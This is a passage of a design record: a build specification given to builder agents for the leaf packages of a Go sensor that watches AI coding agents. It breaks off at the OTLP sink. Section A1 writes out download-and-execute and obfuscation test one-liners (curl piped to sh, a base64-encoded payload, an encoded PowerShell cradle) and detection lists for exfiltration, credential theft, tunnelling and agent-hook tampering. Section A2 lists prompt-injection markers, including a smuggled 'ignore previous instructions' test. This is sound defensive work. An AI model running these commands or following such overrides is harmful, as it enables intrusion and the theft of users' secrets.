> **Historical design record.** Build specification for the agents that wrote the first packages (group A, leaf packages). Its sections A1 to A8 are build sections, not the assumption numbers of `design/v0.md`. It told builders to keep the exported API exactly as specified and to report any deviation (section "Rules for every builder"); the later group C specification told its builders that the group A and B code, once built, was the contract and the older spec text was not (`design/BUILD-C.md`, the paragraph above C1).
>
> - Written on 2026-11-11, during design (the file was last modified 2026-11-11 17:53 UTC on the build machine; it has no date of its own).
> - Written under the working name **spoor** (binary `spoor`, rule ids `SPR-...`, osquery tables `spoor_*`, environment prefix `SPOOR_`). The project was renamed hawkbell on 2026-11-12 (commit d261f98), and those became `hawkbell`, `HB-...`, `hawkbell_*` and `HAWKBELL_`.
> - Findings, numbers, plans and file names describe the design, the prototypes and the sources as they were then, not the release. For what the release does, read [docs/ASSUMPTIONS.md](../docs/ASSUMPTIONS.md) and [docs/LIMITATIONS.md](../docs/LIMITATIONS.md).
> - Local paths (`/home/user/...`, `/root/...`, `/tmp/claude-0/...`, `$S/...` for the session scratch directory, and work-directory variables the text defines) name directories on the build machine, a Linux sandbox VM. The scripts, outputs and downloaded sources in them are not in this repository.
> - Redactions, each marked `[redacted: <reason>]` in the text: the session id in the scratch directory path (1 place); a credential-format test literal in section A2, an AWS example access key id (1 place).
> - Below the line the text is the original, unchanged except for the redactions listed. Other records cite these files by line number; such a number counts from the original's first line, which is line 12 of this file.

---

# spoor build spec, group A (leaf packages)

Repo: `/home/user/thomastysong/spoor` (Go module `github.com/thomastysong/spoor`, go 1.26, CGO_ENABLED=0 always).
Contract already written and tested: `internal/event` (read `event.go`, `records.go`, `time.go` first; do not change exported names there. If you need a new field, add it and say so in your return summary).

## Rules for every builder

- You own ONLY the directories listed for your package. Do not edit other packages. NEVER run `go get`, `go mod tidy` or edit `go.mod`/`go.sum`: other builders are working in the same module at the same time. Every allowed third-party module is already pinned in `go.mod` (via `internal/deps`): `mvdan.cc/sh/v3`, `gopkg.in/yaml.v3`, `github.com/BurntSushi/toml`, `golang.org/x/sys`, `golang.org/x/text`, `modernc.org/sqlite`, `github.com/osquery/osquery-go`, `github.com/klauspost/compress` (zstd only). Anything else: do without and use the standard library. Do not run `git` commands that change state (no add/commit/stash/checkout).
- Pure Go, no CGO, must compile for linux, darwin, windows on amd64 and arm64. Before you finish run, from the repo root: `go build ./internal/<pkg>/... && go vet ./internal/<pkg>/... && go test ./internal/<pkg>/...` and `GOOS=windows go build ./internal/<pkg>/... && GOOS=darwin go build ./internal/<pkg>/...`. Other packages may be mid-build and broken: only build your own paths.
- Tests are part of the deliverable: table-driven, including hostile inputs (huge, deeply nested, invalid UTF-8, path traversal, symlinks where relevant) and at least the cases named in your section. No network in tests. No test may write outside `t.TempDir()`.
- The sensor is security software running on machines where the attacker controls agent output. Treat every input (hook stdin, transcripts, config files, command lines) as hostile: bound sizes, bound recursion depth, never execute discovered binaries, never follow symlinks out of the tree you were asked to read, never build file names from untrusted ids without hashing, never panic (recover at package boundaries and return an error).
- Never emit secret VALUES. Names of env vars / headers are fine. When in doubt, redact and attach a fingerprint (first 8 hex of SHA-256).
- Comments explain WHY (the constraint), not what. No TODO stubs for behaviour the spec requires; if something cannot be done, return an explicit "unsupported" result and document it in the package doc comment.
- Keep exported API exactly as specified below (names, signatures). You may add unexported helpers and extra exported helpers that do not conflict.
- Facts about agents must come from the research reports in `/tmp/claude-0/-home-user/[redacted: session id]/scratchpad/research/` (`agent-surfaces-a.md`, `agent-surfaces-b.md`, `adr-discovery.md`, `adr-sensor.md`, `snyk-agent-scan.md`, `agent-bom.md`, `small-oss.md`, `fleet.md`, `fluentbit.md`, `os-telemetry.md`, `standards.md`, `threats.md` when present) or from primary sources you read now (curl works for raw.githubusercontent.com and code.claude.com). Local clones for cross-checks: `/home/user/uber/adr`, `/home/user/snyk/agent-scan`, `/home/user/fleetdm/fleet/orbit/pkg/table/ai_tools`. Where a fact is unverified, mark it in a code comment `// UNVERIFIED:`.
- uber/ADR, snyk/agent-scan and numbat are Apache-2.0, agentic-detector (Fleet ai_tools) is MIT: you may reuse data tables (paths, ids) with attribution; list anything reused in your return summary so NOTICE can credit it. Do not copy code wholesale.
- Return: a short summary (files created, exported API deviations, tests run and their result, unverified facts, anything the integrator must know).

## A1. `internal/shellx` — command-line analysis

Purpose: turn a shell command string into facts that rules match on, so detections do not depend on regexes over raw text.

```go
package shellx

type Dialect string
const ( Posix Dialect = "posix"; PowerShell Dialect = "powershell"; Cmd Dialect = "cmd" )

// Analyze never panics and always returns non-nil Facts. hint "" means auto-detect.
// Input is capped (first 256 KiB analysed; Facts.Truncated set).
func Analyze(cmdline string, hint Dialect) *Facts

type Command struct {
    Name    string   // basename, lower-cased, ".exe" stripped
    Path    string   // command word as written
    Args    []string // literal args with quotes removed; unresolvable parts rendered as "$VAR" or "$(...)"
    Origin  string   // top | subshell | substitution | inline:<interp> | eval | decoded | wrapper
    Dynamic bool     // name or an argument depends on an expansion that could not be resolved statically
}

type InlineCode struct{ Lang, Code string } // code handed to an interpreter with -c / -e / --eval / heredoc

type PkgInstall struct {
    Manager  string   // npm | pnpm | yarn | bun | pip | uv | pipx | cargo | go | gem | brew | apt | dnf | winget | choco | scoop | npx | uvx | bunx
    Packages []string // "name" or "name@version" / "name==version" exactly as written, registry URLs and git URLs kept
    Global   bool
    Exec     bool     // npx/uvx/bunx/pipx run style fetch-and-run
    Flags    []string
}

type Facts struct {
    Dialect    Dialect
    ParseOK    bool        // false when the real parser failed and tokenised heuristics were used
    Truncated  bool
    Commands   []Command   // every simple command found, at any nesting depth (depth cap 6)
    Pipelines  [][]int     // indexes into Commands, one slice per pipeline with 2+ stages
    URLs       []string
    Hosts      []string    // from URLs, scp/ssh targets, nc/curl host args, /dev/tcp/host/port
    Reads      []string    // paths read: args of cat/less/head/tail/base64/xxd/strings/openssl, input redirects, cp/mv/scp/rsync sources, curl -d @file / -F x=@file / -T file, tar sources
    Writes     []string    // output redirects, tee, cp/mv/install destinations, curl -o / wget -O, dd of=, sed -i targets, ln targets
    Deletes    []string    // rm/rmdir/unlink/shred/Remove-Item/del targets
    EnvAssign  []string    // names of variables assigned on the command line
    Interpreters []string  // interpreters that receive code from a pipe, -c/-e, heredoc or process substitution
    Inline     []InlineCode
    Decoded    []string    // text recovered from base64/hex/-EncodedCommand payloads (each is re-analysed; its commands appear in Commands with Origin "decoded")
    Installs   []PkgInstall
    Downloads          bool // curl/wget/fetch/Invoke-WebRequest/iwr/irm/certutil -urlcache/bitsadmin/aria2c/scp from remote/git clone
    PipeToInterpreter  bool // a pipeline stage feeds an interpreter (| sh, | bash -s, | python -, | iex, <(curl ...))
    DownloadAndExecute bool // download output reaches an interpreter, or downloaded file is executed/chmod +x'd in the same command line
    Eval               bool
    Sudo               bool
    Background         bool // &, nohup, setsid, disown, Start-Process -WindowStyle Hidden, start /b
    HereDoc            bool
    Obfuscation []string // closed vocabulary: base64_decode_exec, hex_escape, ifs_abuse, var_indirection, eval, char_concat, encoded_command, rev_exec, long_single_token
    // Semantic categories (closed vocabularies, documented in the package doc):
    Destructive    []string // rm_recursive_root, rm_recursive_home, rm_recursive_wildcard, disk_wipe, mkfs, git_force_push, git_reset_hard, git_clean_force, git_history_rewrite, db_drop, db_truncate, kubectl_delete, kubectl_delete_namespace, terraform_destroy, cloud_delete, docker_prune_all, chmod_recursive_open, truncate_file, find_delete
    Persistence    []string // cron, launchd, systemd, shell_profile, registry_run, scheduled_task, ssh_authorized_keys, git_hook, login_item, at_job
    DefenseEvasion []string // stop_security_tool, disable_gatekeeper, disable_sip, defender_tamper, firewall_disable, history_clear, log_clear, sensor_tamper, agent_hook_tamper, selinux_disable, audit_disable
    CredAccess     []string // keychain_dump, token_print (gh auth token, gcloud auth print-access-token, aws configure export-credentials, az account get-access-token, kubectl config view --raw, npm token, docker config), env_dump, ssh_key_read, browser_cred, cloud_metadata, secret_file_read, password_store, proc_environ_read
    Exfil          []string // http_upload_file, http_post_data, scp_out, rsync_out, dns_tunnel, netcat_out, git_push_new_remote, paste_post, webhook_post, email_send, cloud_bucket_upload
    NetTools       []string // nc, ncat, socat, ssh_reverse_tunnel, ngrok, cloudflared, tailscale_funnel, chisel, frp, bore, localtunnel, tor
    Recon          []string // whoami, id, uname, hostname, ifconfig/ip, netstat/ss, ps, env, find_secrets, cloud_identity (aws sts get-caller-identity etc.), nmap
    Privilege      []string // sudo, su, setuid_chmod, sudoers_edit, docker_privileged, docker_socket_mount, cap_add
    GitOps         []string // push, push_force, remote_add, config_credential, clone, commit_no_verify
}
```

Requirements
- POSIX/bash: parse with `mvdan.cc/sh/v3/syntax` (bash variant). Walk the AST: simple commands, pipelines, lists (`&&`, `||`, `;`), subshells, command and process substitution, redirects, heredocs, env-prefixes (`FOO=bar cmd`), wrappers that take a command (`sudo`, `env`, `nohup`, `time`, `timeout`, `xargs`, `watch`, `nice`, `stdbuf`, `doas`, `command`, `exec`, `busybox`, `ssh host <cmd>`, `docker exec/run ... <cmd>`, `kubectl exec ... -- <cmd>`, `find -exec`), inline code (`bash -c`, `sh -c`, `python -c`, `node -e`, `perl -e`, `ruby -e`, `php -r`, `pwsh -Command`, `osascript -e`). Strings given to `sh -c`/`bash -c`/`eval` are re-parsed recursively.
- Static resolution: simple variable assignments earlier in the same command line are substituted (`u=https://x; curl $u | sh`), `$IFS` and `${IFS}` are treated as spaces, adjacent quoted fragments are concatenated (`c'u'r"l"`), `\`-escapes removed, backtick substitution handled. What cannot be resolved sets `Dynamic` and, when the command NAME is dynamic, adds `var_indirection`.
- Decoding: `echo <b64> | base64 -d | sh`, `base64 -d <<< ...`, `printf '\x..' | sh`, `xxd -r -p`, `rev | sh`, PowerShell `-EncodedCommand`/`-enc` (UTF-16LE base64), `[Convert]::FromBase64String`. Decoded text over 64 KiB is dropped. Depth-limit recursion.
- PowerShell and cmd: no AST available; write a careful tokenizer (quotes, backtick escapes, `;`, `|`, `&&`, `&`, `^` for cmd). Recognise aliases (`iwr`, `irm`, `iex`, `curl`→Invoke-WebRequest in Windows PowerShell, `saps`, `ri`, `del`, `rd`, `copy`, `type`, `gc`), `Invoke-Expression`, `DownloadString`/`DownloadFile`, `Start-BitsTransfer`, `certutil -urlcache -f`, `bitsadmin`, `reg add ...\Run`, `schtasks /create`, `Set-MpPreference`, `Add-MpPreference -ExclusionPath`, `Stop-Service`, `sc stop`, `wevtutil cl`, `vssadmin delete shadows`, `rundll32`, `mshta`, `regsvr32`. Auto-detect dialect from tokens when hint is "".
- Semantics: fill the category slices from commands + args. Be precise: `rm -rf ./build` is NOT destructive; `rm -rf /`, `rm -rf ~`, `rm -rf $HOME`, `rm -rf *` at unknown cwd, `rm -rf "$UNSET/"` patterns are. `git push --force-with-lease` is `git_force_push`. `kubectl delete pod x` is `kubectl_delete`; `kubectl delete ns|namespace` is `kubectl_delete_namespace`. Security tools list for `stop_security_tool` / `sensor_tamper`: osqueryd, orbit, fleetd, fluent-bit, td-agent-bit, spoor, falcon/crowdstrike, sentinelone, defender (MsMpEng, mdatp), santa, auditd, sysmon, wazuh, elastic-agent, jamf. `agent_hook_tamper`: writes/deletes/chmods targeting managed hook/settings paths of agents (`managed-settings`, `/etc/claude-code`, `/etc/codex`, `policy.d`, `.claude/settings`, `hooks.json`, `.cursor/hooks.json`, `.gemini/settings.json`) or setting `disableAllHooks`.
- Package installs: parse npm/pnpm/yarn/bun add|install|i, pip/pip3/uv pip install, uv add, pipx install|run, uvx, npx/bunx/pnpm dlx/yarn dlx/npm exec, cargo install, go install, gem install, brew install, apt/apt-get/dnf/yum install, winget/choco/scoop install; capture `--index-url`, `--extra-index-url`, `--registry`, git/URL/tarball specs.
- Performance: Analyze of a 200-char command under 200 µs typical; add a benchmark.
- Tests (minimum): each bullet above; at least 60 table cases mixing malicious and benign look-alikes; fuzz-style test with random bytes that asserts no panic and bounded time; the evasion cases `c'u'r"l" -s http://x|b"a"sh`, `$(printf '\x63\x75\x72\x6c') x | sh`, `a=cu;b=rl; $a$b x|sh`, `curl x -o /tmp/a && chmod +x /tmp/a && /tmp/a`, `bash <(curl -s x)`, `echo Y3VybCB4IHwgc2g= | base64 -d | bash`, `powershell -enc <utf16 b64 of iex(iwr x)>`, `python3 -c "import os;os.system('curl x|sh')"`, `wget -qO- x | python3 -`, `curl x | sudo bash -s -- --flag`.

### A1 hard requirements added after the red-team verification (builder, reviewer and fixer must all enforce these)
- PARSER BOMB (measured with mvdan.cc/sh v3.14.1): 64 KiB of nested parentheses costs about 250 MiB RSS, 256 KiB about 1 GiB, and 384 KiB dies with an unrecoverable `fatal error: stack overflow`. A Go runtime fatal error exits with status 2, which every agent's hook contract reads as "block this tool call", and it cannot be recovered. `Analyze` must therefore refuse to hand such input to the parser: before parsing, scan the text once and compute the maximum nesting depth of `(`, `{`, `$(`, backticks and quotes-aware brackets; if depth exceeds 64, or the text exceeds 64 KiB, do NOT call the mvdan parser at all: use the bounded tokenizer fallback, set `ParseOK=false`, `Truncated` where applicable, and add `Obfuscation: deep_nesting` (new vocabulary value). Recursion in your own walker and in re-analysis of inline/decoded code is depth-capped and iterative where possible. Add tests that feed 1 MiB of `(`, of `$(`, of `{`, of backticks and of `"$(` and assert: no panic, RSS growth under 32 MiB (measure with runtime.ReadMemStats before/after), and completion in under 100 ms. Run them in a child process with a memory limit if you want belt and braces.
- DIALECT DETECTION (measured: 8 of 10 PowerShell and cmd.exe one-liners parse "successfully" as Bash, yielding cmdlet names that match nothing): detection must run BEFORE the POSIX parser and prefer PowerShell when the text contains Verb-Noun cmdlets (`Get-Content`, `Invoke-WebRequest`, `Remove-Item`, `Stop-Service`, `Set-MpPreference`, `Start-Process`...), PowerShell aliases in pipeline position (`iwr`, `irm`, `iex`, `gc`, `ri`, `saps`), `$env:`, `-EncodedCommand`/`-enc`, `[Convert]::`, backtick escapes, or `powershell`/`pwsh` as the first word; prefer cmd when it starts with `cmd /c`, uses `%VAR%`, `^` escapes, `&` chaining with `del`/`copy`/`type`/`reg add`/`schtasks`/`certutil`. An explicit hint always wins. Add the 10-case table from the red team as tests (PowerShell download cradle, encoded command, Remove-Item -Recurse -Force, Stop-Service, Set-MpPreference, Get-Content of a key file, cmd /c with certutil, reg add Run key, schtasks, vssadmin).
- Expose byte spans of credential-bearing argument values so callers can redact structurally: `Facts.SecretSpans [][2]int` (offsets into the original command line) for values after `-p`/`--password`/`-u user:pass`/`--proxy-user`/`-H "Authorization: ..."`/`--token`/`--api-key`/`-passin pass:X`/`-passout`/`-k`, `mysql -pX` attached forms, `sshpass -p`, `docker login -p`, `redis-cli -a`, `7z -pX`, `aws configure set <key> <value>`, assignments to variable names matching secret/token/password/key, URL userinfo, and the same inside nested commands after `--` (`kubectl exec ... -- mysql -pX`). Also expose `Facts.Opaque []string` (closed vocabulary: eval, inline_code, heredoc_interpreter, dynamic_command, decoded_exec, process_substitution_exec, deep_nesting) and `Facts.ExecutesPaths []string` (scripts or binaries run by path: `./x.sh`, `sh x.sh`, `python x.py`, `node x.js`, targets of `chmod +x` in the same line).

## A2. `internal/classify` — paths, hosts, secrets, text

```go
package classify

type PathCtx struct{ CWD, Home, OS string } // OS: linux|darwin|windows ("" = runtime.GOOS)

// PathClasses returns closed-vocabulary classes for a path (may be relative; resolved against CWD lexically, ~ and $HOME / %USERPROFILE% expanded, case-insensitive on windows/darwin, never touches the filesystem).
func PathClasses(path string, ctx PathCtx) []string
// Classes: secret_env (.env, .env.*, not .env.example/.sample/.template), ssh_private_key, ssh_config, ssh_authorized_keys, cloud_credentials (aws, gcloud, azure, oci, doctl ...), kube_config, docker_config, git_credentials, netrc, npm_token (.npmrc), pypi_token (.pypirc), gpg_keyring, password_store, keychain, browser_data, crypto_wallet, shell_history, shell_profile, system_auth (/etc/shadow, sudoers, SAM), cron, launchd, systemd_unit, startup_item, agent_config (settings of any catalogued agent), agent_managed_policy, agent_hook, agent_memory (CLAUDE.md, AGENTS.md, GEMINI.md, .cursorrules, .cursor/rules, copilot-instructions.md, memory dirs), agent_skill, agent_transcript, mcp_config, sensor_files (spoor, osquery/orbit, fluent-bit dirs), vcs_hook (.git/hooks), vcs_internal (.git/config etc.), ci_config (.github/workflows, .gitlab-ci.yml, Jenkinsfile, .circleci), package_manifest, lockfile, dockerfile, iac (terraform, k8s manifests), cert_private_key (*.pem, *.key, *.p12, *.pfx), token_file (names containing token/secret/credential), temp, device (/dev/sd*, /dev/disk*), proc_environ, outside_cwd, home_root, system_dir.
func IsSensitiveRead(classes []string) bool   // classes whose READ is credential access
func IsSensitiveWrite(classes []string) bool  // classes whose WRITE is persistence / tamper

// HostClasses: llm_api, paste_site, file_share, tunnel, webhook_sink (webhook.site, requestbin, pipedream, interact.sh, burpcollaborator, oast.*), chat_webhook (discord, slack, telegram bot API), url_shortener, code_host, package_registry, cloud_metadata (169.254.169.254, metadata.google.internal, fd00:ec2::254), raw_ip, private_ip, loopback, dynamic_dns, onion, object_storage, mail.
func HostClasses(host string) []string
func URLHost(raw string) string // tolerant host extraction (scheme optional, userinfo stripped, lowercase, port removed)

type SecretHit struct{ Kind string; Start, End int; Fingerprint string } // Fingerprint = first 8 hex of sha256(secret)
// FindSecrets detects credentials by provider-specific patterns first (aws_access_key_id, aws_secret, github_pat/gho/ghs/ghu/fine-grained, gitlab_pat, anthropic_api_key, openai_api_key, google_api_key, gcp_service_account, azure_storage_key, slack_token, slack_webhook, stripe_key, twilio, sendgrid, npm_token, pypi_token, huggingface_token, jwt, private_key_block, basic_auth_url, bearer_header, database_url_with_password, generic high-entropy assignment to names matching (?i)(secret|token|passwd|password|api[_-]?key|credential)), with a Shannon-entropy gate and a placeholder filter (xxx, changeme, example, your-..., <...>, ${...}, test fixtures like [redacted: AWS documentation example access key id]).
func FindSecrets(s string) []SecretHit
func Redact(s string) (string, []SecretHit)       // replaces each hit with "[REDACTED:<kind>:<fp>]"
func RedactArgs(args []string) []string           // flag-aware: value after --token/--password/--api-key/--secret/--auth/--bearer/--client-secret/-H Authorization..., key=value forms, URL userinfo
func RedactURL(raw string, keepQuery bool) string // strips userinfo always; query and fragment unless keepQuery (then redacts secret-like params)
func RedactMap(m map[string]any, maxString int) (out map[string]any, truncated []string) // deep copy, Redact on every string, strings over maxString cut to head+tail with marker, depth cap 12, key-name based redaction for password/token/secret/authorization keys

type TextFindings struct {
    TagChars     int      // U+E0000..U+E007F (ASCII smuggling)
    Bidi         int      // U+202A..U+202E, U+2066..U+2069
    ZeroWidth    int      // U+200B..U+200D, U+2060, U+FEFF (not at offset 0)
    Variation    int      // suspicious runs of variation selectors
    Homoglyph    bool     // mixed-script identifiers in command-like tokens
    DecodedTags  string   // tag characters decoded to ASCII, capped 512
    Markers      []string // closed vocabulary of instruction-override markers found (ignore_previous, system_prompt_override, do_not_tell_user, exfil_instruction, tool_call_injection, role_tag_injection, base64_blob_instruction, hidden_html_comment_instruction, markdown_image_exfil)
}
func ScanText(s string) TextFindings // caps input at 1 MiB
func Entropy(s string) float64
```

Tests: every class with positive and negative cases on all three OS path styles; secret detectors with true positives (synthetic, never real keys) and the false-positive traps (git SHAs, UUIDs, base64 images, lockfile integrity hashes, example keys, long hex in package-lock); canary test: `Redact` output must never contain any synthetic secret from the table; `RedactArgs` on `curl -H "Authorization: Bearer X" --data 'password=Y' https://u:p@h/`; ScanText with tag-smuggled "ignore previous instructions".

## A3. `internal/mcpconf` — MCP declarations

```go
package mcpconf

type Format string
const (
    FormatMCPServers Format = "mcpServers"      // {"mcpServers": {name: {...}}}: Claude Code/Desktop, Cursor, Windsurf, Cline, Gemini CLI, Copilot CLI, Amp, Kiro, Antigravity ...
    FormatClaudeJSON Format = "claude.json"     // ~/.claude.json: top-level mcpServers plus projects.<path>.mcpServers
    FormatVSCode     Format = "vscode"          // {"servers": {...}} and settings.json "mcp": {"servers": ...}
    FormatZed        Format = "zed"             // settings.json "context_servers"
    FormatCodexTOML  Format = "codex.toml"      // [mcp_servers.<name>]
    FormatOpenCode   Format = "opencode"        // "mcp": {name: {type: local|remote, command: [..], url}}
    FormatContinue   Format = "continue.yaml"   // mcpServers list in YAML (and legacy config.json)
    FormatGoose      Format = "goose.yaml"      // extensions: {name: {type: stdio|sse|streamable_http, cmd, args, uri, envs}}
    FormatAuto       Format = ""                // sniff by content
)

type Server struct {
    Name       string
    SourcePath string
    Project    string            // project path when declared under projects.<path> or found in a project file
    Transport  string            // stdio | http | sse | ws
    Command    string
    Args       []string
    Env        map[string]string // LOCAL ONLY: never emit values
    URL        string
    Headers    map[string]string // LOCAL ONLY
    Enabled    *bool
}

// Parse is tolerant: JSON with comments and trailing commas, BOM, CRLF; 20 MiB cap; unknown shapes return (nil, nil); a malformed entry is skipped, not fatal.
func Parse(path string, data []byte, f Format) ([]Server, error)
// Normalize derives launch facts. Never includes secret values.
func Normalize(s Server) event.MCP
// DefinitionHash is a stable SHA-256 over transport, command, args, sorted env NAMES, URL (no userinfo/query), sorted header NAMES. Used for drift ("rug pull") detection of the declaration.
func DefinitionHash(s Server) string
// RiskFlags: closed vocabulary — unpinned_package, remote_fetch_exec (npx -y / uvx / bunx / docker run :latest / curl|sh in command), inline_secret (credential-shaped literal in args, env or headers), plaintext_transport (http:// to non-loopback), deprecated_transport (sse), shell_wrapper (sh -c / bash -c / cmd /c / powershell -c as command), broad_filesystem (filesystem server rooted at / or ~ ), local_script (launches a script from a user-writable path), token_in_url, docker_privileged, docker_socket.
func RiskFlags(s Server) []string
```

Normalize details: runner detection for `npx`, `bunx`, `pnpm dlx`, `yarn dlx`, `npm exec`, `bun x`, `uvx`, `uv tool run`, `uv run`, `pipx run`, `python -m`, `node <file>`, `deno run`, `docker run`, `podman run`, with a value-taking-flag table so the package is not confused with a flag value (`npx -y -p pkg cmd`, `uvx --from pkg cmd`, `docker run -e K=V --rm image:tag`). `Pinned` is true only for an exact semver/PEP 440 version (no ranges, no `latest`, no dist-tags) or an OCI digest (`@sha256:`). `AuthMode`: none | env | header | oauth | inherited. Inline secret detection uses `classify.FindSecrets` (import `internal/classify`; if it is not built yet when you start, code against the signature in A2 and verify at the end).
Tests: one fixture per format (inline strings), `~/.claude.json` with project-scoped servers, JSONC, Codex TOML, Goose YAML, opencode command arrays, VS Code `inputs`/`${input:x}` placeholders (not secrets), launch-form matrix for pinning (at least 25 forms), definition hash stability under key reordering and env VALUE changes (hash must NOT change when only a secret value rotates), risk flags.

## A4. `internal/catalog` + `catalog/*.yaml` — product fingerprints (data-driven)

Goal: adding an agent is a data change. Embed the YAML with `go:embed` from `internal/catalog/data/*.yaml` (keep the data inside the package directory so embed works; the repo-level `catalog/` dir is not used).

```go
package catalog

type OSPaths struct{ Linux, Darwin, Windows []string } // ~ = user home; %VAR% and $VAR expanded by the consumer; globs allowed

type MCPConfig struct{ Paths OSPaths; ProjectPaths []string; Format string; Scope string } // ProjectPaths are relative to a project root (".mcp.json", ".cursor/mcp.json")
type Transcript struct{ Format string; Globs OSPaths; HomeEnv string } // Format: claude-jsonl | codex-rollout | copilot-events | gemini-chats | cursor-sqlite | opencode-sqlite | cline-json | ...
type Hooks struct {
    Dialect      string  // claude | codex | copilot | gemini | cursor | "" (none)
    ManagedPaths OSPaths // admin-tier file(s) spoor would write
    UserPaths    OSPaths
    ProjectPaths []string
    Notes        string
}
type Setting struct{ File OSPaths; Format string; Key string; Op string; Value string; Flag string; Severity string } // risky setting probe: Key is a dotted path, Op: eq|ne|exists|contains|in

type Product struct {
    ID, Name, Vendor string
    Kind         string   // event.AssetKind value
    Aliases      []string // former names / renames, for documentation and matching
    Binaries     []string // executable basenames (no .exe)
    ProcessNames []string // process names when different from binaries
    ProcessArgs  []string // RE2 patterns matched against the full command line for interpreter-launched agents (node .../@anthropic-ai/claude-code/cli.js)
    Packages     []string // "<mgr>:<name>": npm, pip, pipx, uv, brew, cask, winget, scoop, choco, cargo, go, apt, snap, flatpak
    BundleIDs    []string // macOS
    WinDisplay   []string // registry Uninstall DisplayName patterns (case-insensitive substring)
    Appx         []string
    DesktopIDs   []string // Linux .desktop ids
    ExtensionIDs []string // VS Code family "publisher.name"
    JetBrainsIDs []string
    ChromeIDs    []string
    InstallPaths OSPaths
    StateDirs    OSPaths
    HomeEnv      []string // env vars that relocate the state dir (CLAUDE_CONFIG_DIR, CODEX_HOME ...)
    EnvMarkers   []string // env var names the agent sets for child processes (CLAUDECODE, GEMINI_CLI ...)
    SessionEnv   []string // env var names carrying the session id for children
    MCP          []MCPConfig
    Skills, Rules, Plugins, Subagents, Commands []string // user-level dirs/files (~ relative); project-relative ones prefixed "./"
    Transcript   *Transcript
    Hooks        *Hooks
    RiskyFlags   []string  // argv flags that disable approvals/sandbox/hooks/persistence
    Settings     []Setting // risky or relevant settings to probe
    Ports        []int
    APIHosts     []string
    Signers      struct{ DarwinTeamID, WindowsPublisher string }
    Capabilities []string  // executes_shell, edits_files, browses, local_inference, mcp_client
    Sources      []string  // provenance URLs for the fingerprints
    Unverified   []string  // field names whose values are not verified against a primary source
}

func Load() (*Catalog, error)                 // embedded data, validated: unique ids, no fingerprint claimed by two products unless both list each other in Aliases
func (c *Catalog) Version() string
func (c *Catalog) Products() []Product
func (c *Catalog) Get(id string) (Product, bool)
func (c *Catalog) ByBinary(name string) []Product
func (c *Catalog) ByBundleID(id string) (Product, bool)
func (c *Catalog) ByExtensionID(id string) (Product, bool)
func (c *Catalog) ByPackage(mgr, name string) (Product, bool)
func (c *Catalog) MatchProcess(name, exe string, args []string) (Product, bool) // needs binary/process name match OR ProcessArgs match; ambiguous short names (goose, amp, q, agent, gemini) require a second evidence class (path or args)
func (c *Catalog) LoadOverlay(dir string) error // user drop-in YAML that adds or overrides products
func Expand(p string, home string, env map[string]string, goos string) string // ~, $VAR, %VAR% expansion without touching the filesystem
```

Data requirements: at least 80 products, covering everything in `research/agent-surfaces-b.md` section 1 and every product in uber/ADR's catalog, with Windows identifiers where they exist. The five hook-capable agents (claude-code, codex, copilot-cli, gemini-cli, cursor) must have complete `Hooks`, `Transcript`, `MCP`, `EnvMarkers`, `SessionEnv`, `RiskyFlags`, `Settings` from `research/agent-surfaces-a.md` (exact paths and flags). Record 2026 renames as Aliases. Mark unverified values in `Unverified`. Split data by category: `agents.yaml`, `ides.yaml`, `desktop.yaml`, `runtimes.yaml`, `extensions.yaml`, `browsers.yaml`.
Tests: catalog loads and validates; every product has at least one fingerprint; no duplicate claims; the five majors have hooks+transcript+MCP; `MatchProcess` positive and negative cases (a process named `goose` in `/usr/games` must not match without a second evidence class; `node /usr/lib/node_modules/@anthropic-ai/claude-code/cli.js` matches claude-code); overlay add/override; `Expand` on all OS styles.

## A5. `internal/sink` and `internal/format` — outputs

```go
package format
func OCSF(e *event.Event) map[string]any         // lossless-enough mapping, see research/standards.md; detection -> Detection Finding (2004), inventory -> the best matching inventory/discovery class, activity tool.pre/post shell -> Process Activity (1007) with the agent in actor, file tools -> File System Activity (1001), web -> HTTP/Network Activity, others -> base event with unmapped; always include metadata.product {name:"spoor", vendor_name:"spoor"}, metadata.version, time (ms), severity_id, and the full native event under "unmapped.spoor".
func OTLPLogs(events []*event.Event, serviceVersion string) ([]byte, error) // OTLP/HTTP JSON ExportLogsServiceRequest: one resource (service.name=spoor, host.id, host.name, os.type), one scope, one logRecord per event; body = kvlistValue of the native event (so Fluent Bit's opentelemetry input turns it into the record map), attributes: event.name=spoor.<type>, spoor.kind, spoor.stream, gen_ai.agent.name, gen_ai.conversation.id, gen_ai.tool.name where applicable; timeUnixNano as decimal string; severityNumber from detection severity.

package sink
type Sink interface { Name() string; Write(batch []*event.Event) error; Flush() error; Close() error }

// Files: append-only NDJSON segments, the durable local log and the Fluent Bit contract.
type FilesOptions struct {
    Dir          string        // segments are <Dir>/<stream>-<YYYYMMDD>-<HH>-<n>.ndjson
    MaxSegment   int64         // roll to n+1 past this size (default 16 MiB)
    RetainBytes  int64         // prune oldest segments beyond this total (default 512 MiB)
    RetainAge    time.Duration // prune segments older than this (default 7 days)
    MaxLineBytes int           // events larger than this are shrunk (drop tool.input/output, then target.command tail) and marked truncated; default 48 KiB so Fluent Bit's tail buffer of 64k is safe
    FileMode     os.FileMode   // default 0640
    Format       string        // native | ocsf
    Now          func() time.Time
}
func NewFiles(o FilesOptions) (Sink, error)
// Contract: one event = one write(2) of one line on a file opened O_APPEND (so concurrent hook processes never interleave); never rename, never truncate, never rewrite; prune by deleting whole segments only; fsync on Flush; on Windows open with FILE_SHARE_READ|WRITE|DELETE so Fluent Bit and pruning can coexist. Several processes may append to the same segment: choose the segment by listing the directory, not by in-memory state alone.
func SegmentName(stream string, t time.Time, n int) string
func ParseSegmentName(name string) (stream string, ok bool)

func NewStdout(w io.Writer, format string) Sink

// Forward: Fluent Forward protocol v1 client (see research/fluentbit.md section 2 for byte-level details verified against Fluent Bit 5.2.0).
type ForwardOptions struct {
    Addr       string        // unix:///run/fluent-bit/spoor.sock | tcp://127.0.0.1:24224 | tls://host:24224
    TagPrefix  string        // default "spoor"; tag is <prefix>.<stream>
    SharedKey  string        // enables the HELO/PING/PONG handshake
    Hostname   string        // self_hostname, must differ from the server's
    Compress   bool          // CompressedPackedForward (gzip)
    Timeout    time.Duration // dial, write and ack wait (default 5s)
    TLS        *tls.Config
}
func NewForward(o ForwardOptions) (Sink, error)
// Contract: PackedForward mode, EventTime ext type 0 with nanoseconds from Event.TS, option {"size": n, "chunk": base64(16 random bytes)}; Write returns nil only after the matching ack; on timeout/close it reconnects once and resends; hand-written MessagePack encoder (maps, arrays, str, bin, int, uint, float64, bool, nil, ext) for map[string]any produced by json round-trip of the event; no third-party msgpack dependency.

// OTLP: HTTP JSON logs exporter.
